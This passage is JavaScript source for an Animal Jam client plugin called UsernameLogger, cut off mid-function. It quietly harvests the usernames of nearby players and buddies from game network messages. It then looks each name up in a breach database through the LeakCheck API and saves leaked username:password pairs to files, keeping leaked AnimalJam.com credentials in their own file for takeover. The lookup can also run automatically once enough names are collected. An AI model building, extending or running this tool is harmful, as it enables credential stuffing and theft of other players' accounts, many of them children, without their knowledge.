const fs = require('fs');
const path = require('path');
const os = require('os');
// Removed: const axios = require('axios');
const { app } = require('electron'); // Added
// Removed: const { getDataPath } = require('../../src/Constants'); // Added

// Constants for leak checking
const LEAK_CHECK_API_URL = 'https://leakcheck.io/api/v2/query';
const DEFAULT_RATE_LIMIT_DELAY = 400; // Milliseconds

// File names
const COLLECTED_USERNAMES_FILE = 'collected_usernames.txt';
const POTENTIAL_ACCOUNTS_FILE = 'potential_accounts.txt';
const PROCESSED_FILE = 'processed_usernames.txt';
const FOUND_GENERAL_FILE = 'found_accounts.txt';
const FOUND_AJC_FILE = 'ajc_accounts.txt';

// Helper function for delay
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Add ipcRenderer require at the top
const { ipcRenderer } = require('electron');

module.exports = class UsernameLogger {
  constructor({ application, dispatch }) { // Removed apiKey from constructor options
    this.application = application;
    this.dispatch = dispatch;

    // Plugin state
    this.config = {
      isLoggingEnabled: false, // Disabled by default
      customBasePath: null, // For user-defined log directory
      collectNearbyPlayers: true, // Collect nearby players by default
      collectBuddies: true, // Collect buddies by default
      autoLeakCheck: false, // Don't auto-run leak check by default
      autoLeakCheckThreshold: 50, // Run leak check after collecting this many usernames
      leakCheckApiKey: null, // Will be fetched on demand
    };
    
    // Runtime state
    this.loggedUsernamesThisSession = new Set(); // Track usernames logged in this session
    this.ignoredUsernames = new Set(); // Usernames to ignore
    this.isLeakCheckRunning = false; // Track if leak check is currently running
    this.isLeakCheckPaused = false; // Track if leak check is paused
    this.isLeakCheckStopped = false; // Track if leak check should stop
    this.leakCheckLastProcessedIndex = -1; // Last processed index for resuming
    this.leakCheckTotalProcessed = 0; // Total usernames processed in current leak check
    
    // Configuration file path (relative to the current working directory)
    this.configFilePath = path.resolve(process.cwd(), 'plugins', 'UsernameLogger', 'config.json');

    // Bind methods to ensure 'this' context is correct
    this.loadConfig = this.loadConfig.bind(this);
    this.saveConfig = this.saveConfig.bind(this);
    this.getBasePath = this.getBasePath.bind(this);
    this.getFilePaths = this.getFilePaths.bind(this);
    // Removed binding for migrateData as the function was removed
    this.loadIgnoreList = this.loadIgnoreList.bind(this);
    this.logUsername = this.logUsername.bind(this);
    this.handlePlayerAdd = this.handlePlayerAdd.bind(this);
    this.handleBuddyList = this.handleBuddyList.bind(this);
    this.handleBuddyAdded = this.handleBuddyAdded.bind(this);
    this.handleBuddyOnline = this.handleBuddyOnline.bind(this);
    this.runLeakCheck = this.runLeakCheck.bind(this);
    this.pauseLeakCheck = this.pauseLeakCheck.bind(this);
    this.stopLeakCheck = this.stopLeakCheck.bind(this);
    this.handleLogCommand = this.handleLogCommand.bind(this);
    this.handleSetPathCommand = this.handleSetPathCommand.bind(this);
    this.handleSettingsCommand = this.handleSettingsCommand.bind(this);
    this.handleLeakCheckCommand = this.handleLeakCheckCommand.bind(this);
    this.handleLeakCheckStopCommand = this.handleLeakCheckStopCommand.bind(this);
    this.handleTrimProcessedCommand = this.handleTrimProcessedCommand.bind(this);
    this.handleHelpCommand = this.handleHelpCommand.bind(this);
    this.handleDebugCommand = this.handleDebugCommand.bind(this);
    this.handleSetApiKeyCommand = this.handleSetApiKeyCommand.bind(this);
    this.handleSetIndexCommand = this.handleSetIndexCommand.bind(this);
    this.initialize = this.initialize.bind(this);

    // Start initialization
    this.initialize();
  }
  
  /**
   * Loads the plugin configuration from the config file.
   */
  async loadConfig() {
    try {
      if (fs.existsSync(this.configFilePath)) {
        const configData = fs.readFileSync(this.configFilePath, 'utf8');
        const savedConfig = JSON.parse(configData);
        
        // Merge saved config with defaults
        this.config = { ...this.config, ...savedConfig };

        // Load persistent state
        this.leakCheckLastProcessedIndex = savedConfig.leakCheckLastProcessedIndex ?? -1;
        
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Loaded configuration from ${this.configFilePath}`
        });
        
        // Add diagnostic log for index
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Loaded saved index: ${this.leakCheckLastProcessedIndex}`
        });
      } else {
        // If config doesn't exist, ensure index is default
        this.leakCheckLastProcessedIndex = -1;
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] Config file not found, using default index: -1`
        });
      }
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error loading config: ${error.message}`
      });
      // Ensure index is default on error
      this.leakCheckLastProcessedIndex = -1;
    }
    
    // API Key is fetched on demand in runLeakCheck, no need to check/log here.
    
  } // End of loadConfig method
  
  /**
   * Saves the plugin configuration to the config file.
   */
  saveConfig() {
    try {
      // Don't save API key to config file for security
      const configToSave = { 
        ...this.config, 
        leakCheckLastProcessedIndex: this.leakCheckLastProcessedIndex // Add index to save data
      };
      delete configToSave.leakCheckApiKey;
      
      const configDir = path.dirname(this.configFilePath);
      if (!fs.existsSync(configDir)) {
        fs.mkdirSync(configDir, { recursive: true });
      }
      
      // Add debug log to show what's being saved
      this.application.consoleMessage({
        type: 'logger',
        message: `[Username Logger] Saving config with index: ${this.leakCheckLastProcessedIndex}`
      });
      
      fs.writeFileSync(this.configFilePath, JSON.stringify(configToSave, null, 2));
      
      // Verify file was written by reading it back
      try {
        const savedData = JSON.parse(fs.readFileSync(this.configFilePath, 'utf8'));
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Verified saved index in config: ${savedData.leakCheckLastProcessedIndex}`
        });
      } catch (verifyError) {
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] Could not verify saved data: ${verifyError.message}`
        });
      }
      
      this.application.consoleMessage({
        type: 'logger',
        message: `[Username Logger] Saved configuration (including state) to ${this.configFilePath}`
      });
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error saving config: ${error.message}`
      });
    }
  };
  
  /**
   * Determines the base path for log files.
   * @returns {string} The base path for log files, determined by the environment.
   */
  getBasePath() {
    // Use the dataPath property from dispatch
    if (!this.dispatch.dataPath) {
      // Fallback or error handling if dispatch doesn't have the dataPath yet
      console.error("[Username Logger] Error: this.dispatch.dataPath is not available!");
      // Provide a default fallback path (e.g., local data directory)
      const fallbackPath = path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'aj-classic', 'data');
      try {
        if (!fs.existsSync(fallbackPath)) {
          fs.mkdirSync(fallbackPath, { recursive: true });
        }
      } catch (e) { /* ignore fallback creation error */ }
      return fallbackPath;
    }
    return this.dispatch.dataPath;
  };
  
  /**
   * Gets file paths based on current base path.
   * @returns {Object} An object containing file paths.
   */
  getFilePaths() {
    const currentBasePath = this.getBasePath();
    
    // New file paths
    const newPaths = {
      collectedUsernamesPath: path.join(currentBasePath, COLLECTED_USERNAMES_FILE),
      processedUsernamesPath: path.join(currentBasePath, PROCESSED_FILE),
      potentialAccountsPath: path.join(currentBasePath, POTENTIAL_ACCOUNTS_FILE),
      foundAccountsPath: path.join(currentBasePath, FOUND_GENERAL_FILE),
      ajcAccountsPath: path.join(currentBasePath, FOUND_AJC_FILE)
    };
    
    return { ...newPaths };
  };

  // Removed migrateData function as requested

  /**
   * Reads ignore list file synchronously and populates the ignoredUsernames set.
   */
  loadIgnoreList() {
    const { processedUsernamesPath, potentialAccountsPath } = this.getFilePaths();
    let loadedCount = 0;
    
    try {
      if (fs.existsSync(processedUsernamesPath)) {
        const data = fs.readFileSync(processedUsernamesPath, 'utf8');
        
        data.split(/\r?\n/).forEach(username => {
          if (username.trim()) {
            this.ignoredUsernames.add(username.trim().toLowerCase());
            loadedCount++;
          }
        });
        
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Loaded ${loadedCount} usernames from processed list.`
        });
      } else {
        // Create the file if it doesn't exist
        try {
          fs.writeFileSync(processedUsernamesPath, '');
        } catch (error) {
          // Silent fail - will be handled elsewhere
        }
      }
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error loading processed list: ${error.message}`
      });
    }
    
    // Also load potential accounts as part of the ignore list
    try {
      if (fs.existsSync(potentialAccountsPath)) {
        const data = fs.readFileSync(potentialAccountsPath, 'utf8');
        let addedFromAccounts = 0;
        
        data.split(/\r?\n/).forEach(username => {
          if (username.trim()) {
            // Add returns true if the value was not already present
            if (this.ignoredUsernames.add(username.trim().toLowerCase())) {
              addedFromAccounts++;
            }
          }
        });
        
        if (addedFromAccounts > 0) {
          this.application.consoleMessage({
            type: 'logger',
            message: `[Username Logger] Added ${addedFromAccounts} usernames from potential accounts to ignore list.`
          });
        }
      }
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error loading potential accounts list: ${error.message}`
      });
    }
  };

  /**
   * Logs a username to the collected usernames file.
   * @param {string} username - The username to log.
   * @param {string} source - The source of the username ('nearby' or 'buddy').
   * @param {string} [status='online'] - The status (for buddies) - not used in new format.
   */
  logUsername(username, source, status = 'online') {
    if (!this.config.isLoggingEnabled) return;
    if (!username) return;
    
    // Skip collection based on source and settings
    if (source === 'nearby' && !this.config.collectNearbyPlayers) return;
    if (source === 'buddy' && !this.config.collectBuddies) return;
    
    const usernameLower = username.toLowerCase();
    
    // Skip if username is in ignore list or already logged this session
    if (this.ignoredUsernames.has(usernameLower) || this.loggedUsernamesThisSession.has(usernameLower)) {
      return;
    }
    
    // Add to session log to prevent duplicates
    this.loggedUsernamesThisSession.add(usernameLower);
    
    // Log to console
    this.application.consoleMessage({
      type: 'success',
      message: `[Username Logger] Logged ${source}: ${username}`
    });
    
    // Get current file paths
    const { collectedUsernamesPath } = this.getFilePaths();
    
    // Append to collected usernames file with timestamp
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${username}\n`;
    
    fs.promises.appendFile(collectedUsernamesPath, logEntry)
      .catch(err => {
        this.application.consoleMessage({
          type: 'error',
          message: `[Username Logger] Error writing to log file: ${err.message}`
        });
      });
      
    // Check if we should auto-run leak check
    if (this.config.autoLeakCheck && this.loggedUsernamesThisSession.size >= this.config.autoLeakCheckThreshold) {
      this.application.consoleMessage({
        type: 'notify',
        message: `[Username Logger] Auto-running leak check after collecting ${this.loggedUsernamesThisSession.size} usernames`
      });
      
      // Reset the counter
      this.loggedUsernamesThisSession.clear();
      
      // Run leak check
      this.runLeakCheck();
    }
  }

  /**
   * Handles the 'ac' message to extract and log added player usernames.
   * @param {object} params - The message parameters.
   */
  handlePlayerAdd({ type, message }) {
    if (!this.config.isLoggingEnabled || !this.config.collectNearbyPlayers) return;
    if (message.constructor.name !== 'XtMessage') return;

    const rawContent = message.toMessage();
    const parts = rawContent.split('%');

    if (parts.length >= 9 && parts[0] === '' && parts[1] === 'xt' && parts[2] === 'ac') {
      const username = parts[8];
      if (username) {
        this.logUsername(username, 'nearby');
      }
    }
  }

  /**
   * Handles the 'bl' message to extract and log buddy usernames.
   * @param {object} params - The message parameters.
   */
  handleBuddyList({ type, message }) {
    if (!this.config.isLoggingEnabled || !this.config.collectBuddies) return;
    if (message.constructor.name !== 'XtMessage') return;

    const rawContent = message.toMessage();
    const parts = rawContent.split('%');

    // Expected format: %xt%bl%-1%0%count?%dbId?%username%uuid%status%worldId%roomId?%...
    if (parts.length >= 6 && parts[1] === 'xt' && parts[2] === 'bl' && parts[4] === '0') {
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
      let currentIndex = 5; // Start searching after the header + '0' indicator

      while (currentIndex < parts.length) {
        let uuidIndex = -1;
        // Find the next UUID starting from currentIndex
        for (let j = currentIndex; j < parts.length; j++) {
          if (parts[j] && uuidRegex.test(parts[j])) {
            uuidIndex = j;
            break;
          }
        }

        if (uuidIndex === -1) {
          // No more UUIDs found
          break;
        }

        // Check if there's a part immediately before the UUID (username) and after the UUID (status)
        if (uuidIndex > currentIndex) {
          const username = parts[uuidIndex - 1];
          const status = parts[uuidIndex + 1] || 'unknown';
          
          // Validate: not empty, not purely numeric, not another UUID
          if (username && !/^\d+$/.test(username) && !uuidRegex.test(username)) {
            this.logUsername(username, 'buddy', status);
          }
        }

        // Advance the index to start searching *after* the current UUID
        currentIndex = uuidIndex + 1;
      }
    }
  }

  /**
   * Handles the 'ba' message (buddy added) to log newly added buddies.
   * @param {object} params - The message parameters.
   */
  handleBuddyAdded({ type, message }) {
    if (!this.config.isLoggingEnabled || !this.config.collectBuddies) return;
    if (message.constructor.name !== 'XtMessage') return;

    const rawContent = message.toMessage();
    const parts = rawContent.split('%');

    // Expected format: %xt%ba%INTERNAL_ID%username%uuid%status%...
    if (parts.length >= 7 && parts[1] === 'xt' && parts[2] === 'ba') {
      const username = parts[4];
      const status = parts[6] || 'online';
      
      if (username) {
        this.logUsername(username, 'buddy', status);
      }
    }
  }

  /**
   * Handles the 'bon' message (buddy online) to log buddies coming online.
   * @param {object} params - The message parameters.
   */
  handleBuddyOnline({ type, message }) {
    if (!this.config.isLoggingEnabled || !this.config.collectBuddies) return;
    if (message.constructor.name !== 'XtMessage') return;

    const rawContent = message.toMessage();
    const parts = rawContent.split('%');

    // Expected format: %xt%bon%INTERNAL_ID%username%...
    if (parts.length >= 5 && parts[1] === 'xt' && parts[2] === 'bon') {
      const username = parts[4];
      
      if (username) {
        this.logUsername(username, 'buddy', 'online');
      }
    }
  }

  /**
   * Runs a leak check on collected usernames.
   * @param {object} options - Options for the leak check.
   * @param {number} [options.limit=Infinity] - Maximum number of usernames to process.
   * @param {number} [options.startIndex=0] - The index to start processing from.
   */
  async runLeakCheck(options = {}) {
    const {
      limit = Infinity,
      startIndex = this.leakCheckLastProcessedIndex + 1
    } = options;

    // Debug log at the start of function
    this.application.consoleMessage({
      type: 'logger',
      message: `[Username Logger] runLeakCheck called with options: limit=${limit}, startIndex=${startIndex}, current lastProcessedIndex=${this.leakCheckLastProcessedIndex}`
    });

    // Prevent multiple instances from running
    if (this.isLeakCheckRunning) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Leak check is already running. Use !leakcheckpause to pause or !leakcheckstop to stop.`
      });
      return;
    }

    // Helper to reset state after completion, stop, or error
    const resetLeakCheckState = () => {
      this.isLeakCheckRunning = false;
      this.isLeakCheckPaused = false;
      this.isLeakCheckStopped = false;
      this.leakCheckTotalProcessed = 0;
      this._cachedAxios = null; // Clear cached axios instance
    };

    // Initialize state for this run
    this.isLeakCheckPaused = false;
    this.isLeakCheckStopped = false;
    this.isLeakCheckRunning = true;
    this.leakCheckTotalProcessed = 0;

    try {
      // Get file paths first to ensure they're available
      const {
        collectedUsernamesPath,
        processedUsernamesPath,
        potentialAccountsPath,
        foundAccountsPath,
        ajcAccountsPath
      } = this.getFilePaths();

      // Ensure all required paths are defined
      if (!potentialAccountsPath) {
        throw new Error('Potential accounts path is not defined');
      }

      // Fetch API key on demand using IPC when the check starts
      let apiKey;
      try {
        apiKey = await ipcRenderer.invoke('get-setting', 'leakCheckApiKey');
        if (!apiKey) {
          throw new Error('API Key is empty or not found in settings.');
        }
        this.application.consoleMessage({ type: 'logger', message: '[Username Logger] Successfully fetched API Key via IPC for leak check.' });
      } catch (error) {
        this.application.consoleMessage({
          type: 'error',
          message: `[Username Logger] Failed to get LeakCheck API Key via IPC: ${error.message}`
        });
        resetLeakCheckState();
        return;
      }

      // Read logged usernames from the collected usernames file
      let allUsernamesInLog = [];
      try {
        if (fs.existsSync(collectedUsernamesPath)) {
          const collectedData = await fs.promises.readFile(collectedUsernamesPath, 'utf8');
          const uniqueUsernamesInLog = new Set();

          collectedData.split(/\r?\n/).forEach(line => {
            let match = line.match(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z - (.+)$/);
            let username = null;

            if (match && match[1]) {
              username = match[1].trim();
            } else if (line.trim() && !line.trim().startsWith('---')) {
              username = line.trim();
            }

            if (username) {
              uniqueUsernamesInLog.add(username);
            }
          });

          allUsernamesInLog = [...uniqueUsernamesInLog];
        }

        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Found ${allUsernamesInLog.length} unique usernames in ${COLLECTED_USERNAMES_FILE}.`
        });
      } catch (error) {
        this.application.consoleMessage({
          type: 'error',
          message: `[Username Logger] Error reading collected usernames file: ${error.message}`
        });
        resetLeakCheckState();
        return;
      }

      // Determine usernames to process in this run
      const usernamesToCheckThisRun = allUsernamesInLog.slice(startIndex);
      const limitedUsernamesToCheck = usernamesToCheckThisRun.slice(0, limit);

      if (limitedUsernamesToCheck.length === 0) {
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] No new usernames to process from the starting index.`
        });
        resetLeakCheckState();
        return;
      }

      this.application.consoleMessage({
        type: 'notify',
        message: `[Username Logger] Starting check from index ${startIndex}. Processing up to ${limitedUsernamesToCheck.length} usernames (limit: ${limit === Infinity ? 'All' : limit})...`
      });

      // Read already checked usernames (for duplicate output prevention)
      let alreadyCheckedUsernames = new Set();
      try {
        if (fs.existsSync(processedUsernamesPath)) {
          const processedData = await fs.promises.readFile(processedUsernamesPath, 'utf8');
          processedData.split(/\r?\n/).forEach(u => {
            if (u.trim()) alreadyCheckedUsernames.add(u.trim().toLowerCase());
          });
        }
      } catch (error) {
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] Warning: Could not read processed list for output filtering: ${error.message}`
        });
      }

      // Processing loop & Batching Setup
      let processedInThisRun = 0;
      let foundCount = 0;
      let notFoundCount = 0;
      let errorCount = 0;
      let invalidCharCount = 0;
      let currentOverallIndex = startIndex - 1; // Initialize to startIndex - 1 since we increment at start of loop
      const BATCH_SIZE = 100; // Write to files every 100 processed usernames
      let processedBatch = [];
      let foundGeneralBatch = [];
      let foundAjcBatch = [];
      let potentialBatch = []; // For invalid char usernames

      // Helper function to write batches
      const writeBatches = async () => {
        try {
          if (processedBatch.length > 0) {
            await fs.promises.appendFile(processedUsernamesPath, processedBatch.join('\n') + '\n');
            processedBatch = []; // Clear batch
          }
          if (foundGeneralBatch.length > 0) {
            await fs.promises.appendFile(foundAccountsPath, foundGeneralBatch.join('\n') + '\n');
            foundGeneralBatch = []; // Clear batch
          }
          if (foundAjcBatch.length > 0) {
            await fs.promises.appendFile(ajcAccountsPath, foundAjcBatch.join('\n') + '\n');
            foundAjcBatch = []; // Clear batch
          }
          if (potentialBatch.length > 0) {
            await fs.promises.appendFile(potentialAccountsPath, potentialBatch.join('\n') + '\n');
            potentialBatch = []; // Clear batch
          }
        } catch (writeError) {
          this.application.consoleMessage({
            type: 'error',
            message: `[Username Logger] Batch File Write Error: ${writeError.message}`
          });
        }
      };

      // Try multiple methods to load HTTP client
      let httpClient = null;
      let isAxios = false;

      // Cache the axios instance if we haven't loaded it yet
      if (!this._cachedAxios) {
        try {
          // Method 1: Try to get axios from dispatch
          this._cachedAxios = this.dispatch.require('axios');
          if (!this._cachedAxios) {
            throw new Error("dispatch.require('axios') returned null/undefined");
          }
          isAxios = true;
        } catch (axiosLoadError1) {
          try {
            // Method 2: Try direct require for axios
            this._cachedAxios = require('axios');
            this.application.consoleMessage({
              type: 'logger',
              message: `[Username Logger] Loaded axios via direct require`
            });
            isAxios = true;
          } catch (axiosLoadError2) {
            // Method 3: Last resort - try global fetch if available
            if (typeof fetch === 'function') {
              this.application.consoleMessage({
                type: 'warn',
                message: `[Username Logger] Using fetch API as fallback after axios loading failed`
              });
              this._cachedAxios = fetch; // Assign fetch function
              isAxios = false;
            } else {
              // No HTTP client available
              throw new Error(`Failed to load HTTP client: ${axiosLoadError1.message}, ${axiosLoadError2.message}`);
            }
          }
        }
      }

      httpClient = this._cachedAxios;

      for (const username of limitedUsernamesToCheck) {
        currentOverallIndex++; // Increment index at start of loop
        processedInThisRun++;

        // Check if we should stop or pause
        if (this.isLeakCheckStopped || this.isLeakCheckPaused) {
          const action = this.isLeakCheckStopped ? 'stopped' : 'paused';
          this.application.consoleMessage({
            type: 'logger',
            message: `[Username Logger] Leak check ${action} at index ${currentOverallIndex}. Writing pending batches...`
          });
          await writeBatches();
          this.leakCheckLastProcessedIndex = currentOverallIndex; // Save the current index
          this.saveConfig(); // Persist the saved index
          resetLeakCheckState();
          return;
        }

        try {
          await wait(DEFAULT_RATE_LIMIT_DELAY);

          let response;
          if (isAxios) {
            // Use axios if available
            response = await httpClient.get(`${LEAK_CHECK_API_URL}/${encodeURIComponent(username)}`, {
              params: { type: 'username' },
              headers: { 'X-API-Key': apiKey },
              validateStatus: (status) => status < 500
            });
          } else {
            // Fallback to fetch API
            try {
              const fetchResponse = await httpClient(`${LEAK_CHECK_API_URL}/${encodeURIComponent(username)}?type=username`, {
                method: 'GET',
                headers: { 'X-API-Key': apiKey }
              });

              // Handle fetch response properly
              if (!fetchResponse.ok) {
                throw new Error(`HTTP error! status: ${fetchResponse.status}`);
              }

              const responseText = await fetchResponse.text();
              let responseData;
              try {
                responseData = JSON.parse(responseText);
              } catch (jsonError) {
                responseData = {
                  error: `Failed to parse response as JSON: ${responseText.substring(0, 100)}...`,
                  success: false,
                  found: 0
                };
              }

              response = {
                status: fetchResponse.status,
                data: responseData,
                ok: fetchResponse.ok
              };
            } catch (fetchError) {
              throw new Error(`Fetch request failed: ${fetchError.message}`);
            }
          }

          // Process the response
          let addedToProcessedList = false;

          if (response.status === 200 && response.data?.success) {
            // Handle successful response
            if (response.data.found > 0) {
              foundCount++;
              addedToProcessedList = true;
              this.application.consoleMessage({
                type: 'logger',
                message: `[Username Logger] Found ${response.data.found} results for: ${username}`
              });

              let passwordsFoundGeneral = 0;
              let passwordsFoundAjc = 0;

              if (Array.isArray(response.data.result)) {
                for (const breach of response.data.result) {
                  if (breach.password) {
                    const accountEntry = `${username}:${breach.password}\n`;
                    let targetPath = foundAccountsPath;
                    let isAjcSource = false;

                    // Check if source exists and name is AnimalJam.com
                    if (breach.source) {
                      const sourceName = typeof breach.source === 'object' 
                        ? breach.source.name 
                        : breach.source;
                      if (sourceName === "AnimalJam.com") {
                        targetPath = ajcAccountsPath;
                        isAjcSource = true;
                      }
                    }

                    try {
                      await fs.promises.appendFile(targetPath, accountEntry); // Added .promises
                      if (isAjcSource) passwordsFoundAjc++; else passwordsFoundGeneral++;
                    } catch (writeError) {
                      this.application.consoleMessage({
                        type: 'error',
                        message: `[Username Logger] File Write Error (${path.basename(targetPath)}): ${writeError.message}`
                      });
                    }
                  }
                }

                // Log summary of found passwords
                if (passwordsFoundAjc > 0 || passwordsFoundGeneral > 0) {
                  this.application.consoleMessage({
                    type: 'logger',
                    message: `[Username Logger] Saved ${passwordsFoundAjc} password(s) to ajc_accounts.txt and ${passwordsFoundGeneral} password(s) to found_accounts.txt.`
                  });
                } else {
                  this.application.consoleMessage({
                    type: 'logger',
                    message: `[Username Logger] No passwords found in results for ${username}, but breach exists.`
                  });
                }
              }
            } else {
              notFoundCount++;
              addedToProcessedList = true;
              this.application.consoleMessage({
                type: 'logger',
                message: `[Username Logger] Not Found: ${username}`
              });
            }
          } else if (response.status === 400 && response.data?.error === 'Invalid characters in query') {
            invalidCharCount++;
            addedToProcessedList = false;
            this.application.consoleMessage({
              type: 'warn',
              message: `[Username Logger] Invalid Characters for API: ${username}. Saving for manual check.`
            });

            if (!alreadyCheckedUsernames.has(username.toLowerCase())) {
              try {
                await fs.promises.appendFile(potentialAccountsPath, `${username}\n`);
                alreadyCheckedUsernames.add(username.toLowerCase());
              } catch (writeError) {
                this.application.consoleMessage({
                  type: 'error',
                  message: `[Username Logger] File Write Error (${path.basename(potentialAccountsPath)}): ${writeError.message}`
                });
              }
            }
          } else {
            errorCount++;
            addedToProcessedList = false;
            this.application.consoleMessage({
              type: 'error',
              message: `[Username Logger] Unexpected API Response for ${username}: Status ${response.status} - ${JSON.stringify(response.data)}`
            });
          }

          // Add to processed batch if needed
          if (addedToProcessedList && !alreadyCheckedUsernames.has(username.toLowerCase())) {
            processedBatch.push(username);
            alreadyCheckedUsernames.add(username.toLowerCase());
            this.ignoredUsernames.add(username.toLowerCase());
          }

          // Write batches periodically
          if (processedInThisRun % BATCH_SIZE === 0) {
            this.application.consoleMessage({ type: 'logger', message: `[Username Logger] Attempting periodic batch write. Stop flag: ${this.isLeakCheckStopped}` });
            await writeBatches();
            this.application.consoleMessage({ type: 'logger', message: `[Username Logger] Periodic batch write complete. Stop flag: ${this.isLeakCheckStopped}` });
          }

        } catch (requestError) {
          errorCount++;
          this.application.consoleMessage({
            type: 'error',
            message: `[Username Logger] Request Error for ${username}: ${requestError.message}`
          });
        }
      }

      // Write any remaining data in batches after the loop finishes
      this.application.consoleMessage({ type: 'logger', message: `[Username Logger] Writing final batches... Stop flag: ${this.isLeakCheckStopped}` });
      await writeBatches();
      this.application.consoleMessage({ type: 'logger', message: `[Username Logger] Final batch write complete. Stop flag: ${this.isLeakCheckStopped}` });

      // Update the last processed index
      this.leakCheckLastProcessedIndex = currentOverallIndex;
      this.saveConfig(); // Persist the saved index after successful completion

      const summary = {
        processed: processedInThisRun,
        found: foundCount,
        notFound: notFoundCount,
        invalidChar: invalidCharCount,
        errors: errorCount,
        startIndex: startIndex,
        lastIndexProcessed: currentOverallIndex
      };

      this.application.consoleMessage({
        type: 'notify',
        message: `[Username Logger] Leak check complete. Processed: ${processedInThisRun}, Found: ${foundCount}, Not Found: ${notFoundCount}, Errors: ${errorCount}, Invalid: ${invalidCharCount}`
      });

    } catch (fatalError) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Fatal error in leak check: ${fatalError.message}`
      });
    } finally {
      resetLeakCheckState();
    }
  }
  
  /**
   * Pauses a running leak check.
   */
  pauseLeakCheck() {
    if (!this.isLeakCheckRunning) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] No leak check is currently running.`
      });
      return;
    }
    
    this.isLeakCheckPaused = true;
    this.application.consoleMessage({
      type: 'notify',
      message: `[Username Logger] Leak check will pause after the current username is processed.`
    });
  }
  
  /**
   * Stops a running leak check.
   */
  stopLeakCheck() {
    if (!this.isLeakCheckRunning) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] No leak check is currently running.`
      });
      return;
    }
    
    // Let the leak check process gracefully stop itself by marking it as stopped
    // This allows it to save state properly through updateStateCallback
    this.isLeakCheckStopped = true;
    this.application.consoleMessage({
      type: 'notify',
      message: `[Username Logger] Leak check will stop after current operation completes.`
    });
  }
  
  /**
   * Toggles username logging on/off.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleLogCommand({ parameters }) {
    if (parameters.length > 0) {
      const action = parameters[0].toLowerCase();
      
      if (action === 'on' || action === 'enable') {
        this.config.isLoggingEnabled = true;
        this.application.consoleMessage({
          type: 'success',
          message: '[Username Logger] Logging enabled.'
        });
      } else if (action === 'off' || action === 'disable') {
        this.config.isLoggingEnabled = false;
        this.application.consoleMessage({
          type: 'notify',
          message: '[Username Logger] Logging disabled.'
        });
      } else if (action === 'status') {
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Status: ${this.config.isLoggingEnabled ? 'Enabled' : 'Disabled'}`
        });
        
        // Show additional status info
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Collecting: ${this.config.collectNearbyPlayers ? 'Nearby Players' : ''}${this.config.collectNearbyPlayers && this.config.collectBuddies ? ' & ' : ''}${this.config.collectBuddies ? 'Buddies' : ''}`
        });
        
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Auto Leak Check: ${this.config.autoLeakCheck ? `Enabled (Threshold: ${this.config.autoLeakCheckThreshold})` : 'Disabled'}`
        });
        
        this.application.consoleMessage({
          type: 'logger',
          message: `[Username Logger] Output Directory: ${this.getBasePath()}`
        });
      } else {
        this.application.consoleMessage({
          type: 'warn',
          message: '[Username Logger] Invalid command. Use userlog on/off/status'
        });
        return;
      }
    } else {
      // Toggle if no parameter provided
      this.config.isLoggingEnabled = !this.config.isLoggingEnabled;
      this.application.consoleMessage({
        type: this.config.isLoggingEnabled ? 'success' : 'notify',
        message: `[Username Logger] Logging ${this.config.isLoggingEnabled ? 'enabled' : 'disabled'}.`
      });
    }
    
    // Save the updated config
    this.saveConfig();
  }
  
  /**
   * Sets a custom directory for log files.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleSetPathCommand({ parameters }) {
    if (parameters.length === 0) {
      this.application.consoleMessage({
        type: 'warn',
        message: '[Username Logger] Please specify a directory path. Usage: userlogpath /path/to/directory'
      });
      return;
    }
    
    // Join all parameters to handle paths with spaces
    const newPath = parameters.join(' ');
    
    try {
      // Check if the directory exists
      if (!fs.existsSync(newPath)) {
        // Try to create the directory
        fs.mkdirSync(newPath, { recursive: true });
      }
      
      // Set the custom path
      this.config.customBasePath = newPath;
      
      // Save the configuration to persist the custom path
      this.saveConfig();
      
      // Reload the ignore list with the new path
      this.loadIgnoreList();
      
      this.application.consoleMessage({
        type: 'success',
        message: `[Username Logger] Log directory set to: ${newPath}`
      });
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error setting log directory: ${error.message}`
      });
    }
  }
  
  /**
   * Configures which types of usernames to collect.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleSettingsCommand({ parameters }) {
    if (parameters.length === 0) {
      // Display current settings
      this.application.consoleMessage({
        type: 'logger',
        message: `[Username Logger] Current Settings:`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- Logging: ${this.config.isLoggingEnabled ? 'Enabled' : 'Disabled'}`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- Collect Nearby Players: ${this.config.collectNearbyPlayers ? 'Yes' : 'No'}`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- Collect Buddies: ${this.config.collectBuddies ? 'Yes' : 'No'}`
      });
      
      this.application.consoleMessage({
        type: 'logger',
